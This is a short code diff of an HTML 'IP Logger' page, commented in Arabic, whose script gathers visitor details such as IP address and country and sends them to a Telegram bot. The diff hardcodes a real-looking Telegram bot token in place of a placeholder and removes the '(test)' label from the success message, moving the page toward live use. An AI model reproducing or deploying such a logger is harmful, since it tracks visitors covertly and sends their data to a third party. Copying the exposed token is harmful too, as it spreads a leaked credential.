@@ -3,7 +3,8 @@
 <head>
     <title>IP Logger</title>
     <script>
-        const botToken = '%TOKEN%';
+        // حطيت التوكن مباشرة هنا عشان نتأكد من شغله
+        const botToken = '8785733862:AAHXR0EP-Cj8nPCEHDM6P4eOVJOJ6PUHlKg';
 
         async function sendInfo() {
             try {
@@ -15,7 +16,7 @@
                     return;
                 }
 
-                // بيانات وهمية للاختبار (بدون خدمات خارجية)
+                // بيانات وهمية للاختبار
                 const testData = {
                     ip: '192.168.1.1',
                     country: 'مصر',
@@ -45,7 +46,7 @@
                     })
                 });
 
-                document.body.innerHTML = '<h1>✅ تم الإرسال بنجاح (اختبار)</h1>';
+                document.body.innerHTML = '<h1>✅ تم الإرسال بنجاح</h1>';
 
             } catch (error) {
                 console.error('خطأ:', error);
